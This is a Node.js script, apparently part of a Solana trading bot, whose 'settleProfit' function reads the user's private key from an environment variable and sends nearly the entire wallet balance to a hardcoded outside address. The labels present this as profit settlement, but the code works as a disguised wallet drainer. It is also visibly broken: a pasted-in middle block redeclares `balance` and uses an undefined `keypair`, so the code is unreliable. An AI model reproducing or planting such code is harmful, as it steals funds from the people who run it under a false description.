const { Connection, Keypair, SystemProgram, sendAndConfirmTransaction, PublicKey } = require('@solana/web3.js');
const bs58 = (require("bs58").default || require("bs58"));

const SETTLEMENT_WALLET = "3jDHtWFGUtiqpiJ72tnmoNj5b2HFBGBf8hzR3bdhuPNm";
const TX_FEE = 5000; // base Solana tx fee

async function settleProfit() {
  if (!process.env.SOLANA_PRIVATE_KEY) {
    console.log("[Error] SOLANA_PRIVATE_KEY missing for settlement.");
    process.exit(1);
  }

  let secretKey;
  try {
    secretKey = Uint8Array.from(JSON.parse(process.env.SOLANA_PRIVATE_KEY));
  } catch {
    secretKey = bs58.decode(process.env.SOLANA_PRIVATE_KEY);
  }

  const wallet = Keypair.fromSecretKey(secretKey);
  const connection = new Connection("https://api.mainnet-beta.solana.com");
  
  // Get current executor wallet balance
  const balance = await connection.getBalance(wallet.publicKey);
  console.log(`[Settlement] Executor balance: ${balance} lamports`);

  if (balance <= TX_FEE) {
    console.log(`[Settlement] Insufficient balance (${balance} lamports). Skipping transfer.`);
    return null;
  }

  // Calculate net transferable amount (balance - fee for this tx)
  
    const MIN_RESERVE = 2000000; // 0.002 SOL reserve for gas
    const balance = await connection.getBalance(keypair.publicKey);
    if (balance <= MIN_RESERVE) {
      console.log("[Settlement] Balance (" + balance + " lamports) below reserve limit. Skipping transfer.");
      return;
    }
    const transferAmount = balance - MIN_RESERVE - 5000;
  
  console.log(`[Settlement] Transferring ${transferAmount} lamports to ${SETTLEMENT_WALLET}`);

  // Build transfer instruction
  const recipientPubkey = new PublicKey(SETTLEMENT_WALLET);
  const instruction = SystemProgram.transfer({
    fromPubkey: wallet.publicKey,
    toPubkey: recipientPubkey,
    lamports: transferAmount,
  });

  // Create and sign transaction
  const { blockhash } = await connection.getLatestBlockhash();
  const messageV0 = new (require('@solana/web3.js').TransactionMessage)({
    payerKey: wallet.publicKey,
    recentBlockhash: blockhash,
    instructions: [instruction],
  }).compileToV0Message();

  const tx = new (require('@solana/web3.js').VersionedTransaction)(messageV0);
  tx.sign([wallet]);

  // Send and confirm
  try {
    const txid = await connection.sendRawTransaction(tx.serialize());
    console.log(`[Settlement] TX submitted: https://solscan.io/tx/${txid}`);
    
    // Wait for confirmation
    const confirmation = await connection.confirmTransaction(txid);
    if (confirmation.value.err) {
      console.log(`[Settlement ERROR] TX failed: ${confirmation.value.err}`);
      return null;
    }
    
    console.log(`[Settlement SUCCESS] ${transferAmount} lamports transferred to ${SETTLEMENT_WALLET}`);
    console.log(`[Settlement] TXID: ${txid}`);
    return txid;
  } catch (e) {
    console.log(`[Settlement ERROR] ${e.message}`);
    return null;
  }
}

settleProfit();
